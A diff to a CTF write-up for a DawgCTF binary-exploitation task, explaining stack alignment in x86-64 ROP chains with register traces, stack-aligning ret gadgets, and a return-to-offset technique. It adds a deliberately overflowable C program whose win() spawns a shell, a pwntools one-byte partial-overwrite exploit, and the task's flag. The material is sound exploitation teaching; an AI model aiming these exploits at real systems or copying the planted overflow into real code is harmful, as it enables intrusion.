@@ -267,17 +267,15 @@ Next we can see that we create space on the stack for locals with `sub rsp, 0x90
 
 Now when we go to `call` another function, such as `win1`, we will push the address to return to, that is the address of the instruction after the `call` instruction, onto the stack and this will align the stack down to an 8 byte boundary again. If this isn't clear remember that `call` is sort of like `push return-address; jmp func;` fused together.
 
-Let's contrast with returning to `win1`. The `ret` instruction that starts our rop chain off will add 8 bytes to the stack pointer after reading the value of `win1` from the stack and then rip to `win1`. At first this is not a problem as in the `call` example we've offset the stack pointer by pushing a return address onto the stack and in the `ret` example we've also offset the stack pointer by 8 bytes by popping a return address from the stack albeit by offseting the stack pointer in different directions. But what happens we don't just return to `win1` but also to `win2`?
-
-Let's compare and constrast the operations on the stack pointer and the stack pointer's alignment throughout:
+Let's compare and contrast the operations on the stack pointer and the stack pointer's alignment when calling `win1` and then calling `win2` vs returning to `win1` and then returning to `win` throughout when both are already aligned to a 16 byte boundary:
 
 rsp = 0x7ffc9547d2b0, rbp = 0x7ffc9547d340
 1) call win1; rsp = 0x7ffc9547d2a8, rbp = 0x7ffc9547d340
 1) push rbp; rsp = 0x7ffc9547d2a0, rbp = 0x7ffc9547d340
 1) mov rbp, rsp; rsp = 0x7ffc9547d2a0, rbp = 0x7ffc9547d2a0
 1) ...
-1) leave; rsp = 0x7ffc9547d2a8, rbp = 0x7ffc9547d2a0
-1) ret; rsp = 0x7ffc9547d2b0, rbp = 0x7ffc9547d2a0
+1) leave; rsp = 0x7ffc9547d2a8, rbp = 0x7ffc9547d340
+1) ret; rsp = 0x7ffc9547d2b0, rbp = 0x7ffc9547d340
 1) call win2 ; rsp = 0x7ffc9547d2a8, rbp = 0x7ffc9547d340
 1) push rbp; rsp = 0x7ffc9547d2a0, rbp = 0x7ffc9547d340
 1) mov rbp, rsp; rsp = 0x7ffc9547d2a0, rbp = 0x7ffc9547d2a0
@@ -298,15 +296,21 @@ rsp = 0x7ffc9547d2b0, rbp = 0x7ffc9547d340
 
 Now we've changed the alignment of the stack pointer by the time we reach `win2`.
 
+Note that its not typical to start a rop chain, that is to execute the ret instruction that starts the rop chain, with rsp aligned to a 16 byte boundary as is shown above. Try yourself to work through the steps of the rop chain above starting with `rsp = 0x7ffc9547d2b8` and `rbp = 0x7ffc9547d340` and note how the stack point becomes unaligned within the body of `win1` instead.
+
+The important take away here is that ropping flips the alignment between 8 and 16 byte alignment given the starting alignment when we rop to start of a function and it continues to flip each time to rop to another function.
+
 #### How can we identify issues like this?
 
-The first thing is to be aware of the potential impact of your exploit on the alignment of the stack pointer. Do you call functions that use instructions that require their arguments be 16 byte aligned and derive those arguments from the value of the stack pointer? If the code you return to calls something in libc chances are good that you do!
+The first thing is to be aware of the potential impact of your exploit on the alignment of the stack pointer. Do you return to functions that use instructions that require their arguments be 16 byte aligned and derive those arguments from the value of the stack pointer? If the code you return to calls something in libc chances are good that you do!
 
 The next thing is to check with a debugger. If you get a crash like the one I've shown above here you know that at the very least your exploit is not going to work locally due to stack alignment issues. Now ideally you would use something like `pwninit` along with a copy of the exact versions of libc.so and ld.so that the remote is using in order to get the same stack alignment as the remote but sometimes that is not possible as is the case in this task.
 
 The last thing to consider is that if your exploit works locally but not remotely that you may need to manually align the stack at one of more of the points in your rop chain.
 
 #### How do we manually align the stack?
+
+##### Stack aligning gadgets
 
 The easiest way to do this is to simply return to a `ret` instruction. This works because as a gadget this acts as a `nop` but it will increment the value of the stack pointer by 8. If our stack was previously not aligned to a 16 byte boundary now it will be.
 
@@ -325,17 +329,92 @@ rop.rsi = 0xdeafface
 rop.rdx = 0xfeedcafe
 #rop.raw(p64(rop.find_gadget(['ret']).address)) # stack aligning ret
 rop.call("win3")
-rop.call("exit")
 p.sendline(rop.chain())
 ```
 
-We can see that if we if we simply suspect that there are stack alignment issues there are only 3 logical places to insert stack aligning rets. This means that even in the absolute worst case there are only 3 bits worth or 7 possible permutations ( remember that we are assuming that no stack aligning rets crashes on the remote ).
+We can see that if we if we suspect that there are stack alignment issues there are only 3 logical places to insert stack aligning rets. This means that even in the absolute worst case there are only 3 bits worth or 7 possible permutations ( remember that we are assuming that no stack aligning rets crashes on the remote ).
 
 What do I mean by a logical place? If you remember earlier we saw an example of a crash on `movaps` and I mentioned that a lot of functions inside of libc.so assume that the stack is aligned to 16 bytes. This means that we can say that just before a call to a function that makes further calls to libc.so is a logical place to consider manually aligning the stack.
 
 So in the worst case where your exploit works locally and you don't have libc.so or ld.so simply try adding and removing stack aligning rets at most logical points in your rop chain until it "just works" or your have tried all of the permutations.
 
-Another way to approach this problem is to change where you jump in a function. Consider that by jumping to the very start of a function you will go through the function's prologue and this will setup the stack frame and decrement the stack pointer by 8. You can simply jump later in the function after this has happened and the stack pointer will now by aligned differently. This is generally a little more tricky to get right but also possible.
+##### Returning to an offset
+
+Another way to approach this problem is to change where you jump in a function.
+
+Consider that by jumping to the very start of a function you will go through the function's prologue and this will setup the stack frame and decrement the stack pointer by 8. You can jump later in the function after this has happened and the stack pointer will now by aligned differently.
+
+This can sometimes be the only way to align the stack if for example you have very limited space for your rop chain.
+
+Imagine the following example and assume it is compiled such that we can only control 1 byte of the return address in `vuln`:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+// the order is important to ensure (main&(~0xff)) == (win&(~0xff))
+
+int main() {
+    setup();
+    vuln();
+    return 0;
+}
+
+void vuln() {
+    char buf[32];
+    read(0, buf, 41);
+}
+
+void win() {
+    system("/bin/sh");
+}
+
+void setup() {
+    setbuf(stdin, NULL);
+    setbuf(stdout, NULL);
+    setbuf(stderr, NULL);
+}
+```
+
+Here's the disassembly for `win`:
+
+```bash
+00000000004011be <win>:
+  4011be:       f3 0f 1e fa             endbr64
+  4011c2:       55                      push   rbp
+  4011c3:       48 89 e5                mov    rbp,rsp
+  4011c6:       48 8d 05 37 0e 00 00    lea    rax,[rip+0xe37]
+  4011cd:       48 89 c7                mov    rdi,rax
+  4011d0:       e8 9b fe ff ff          call   401070 <system@plt>
+  4011d5:       90                      nop
+  4011d6:       5d                      pop    rbp
+  4011d7:       c3                      ret
+```
+
+We can see that the first byte of the first instruction after `mov rbp, rsp` is offset 8 bytes from the start of the function.
+
+When we start our rop chain with the `ret` at the end of `vuln` the stack will be 8 byte aligned. This means that to return to `win` without misaligning the stack we must rop after the `push rbp` at the very least:
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+elf = ELF("./task", checksec=False)
+context.binary = elf
+p = elf.process()
+
+payload = b"A" * 0x28
+payload += p8((elf.symbols["win"] + 0x8) & 0xff)
+p.send(payload)
+
+p.interactive()
+````
+
+I encourage you try offsets of 0 and 8 yourself with a debugger to see what happens.
+
+For the full source of this example see here https://github.com/rerrorctf/mini-ctf/tree/main/pwn/ret2win/ret2win_read_1_byte.
 
 ## Flag
 `DawgCTF{C0ngR4tul4t10ns_d15c1p13_y0u_4r3_r34dy_2_pwn!}`
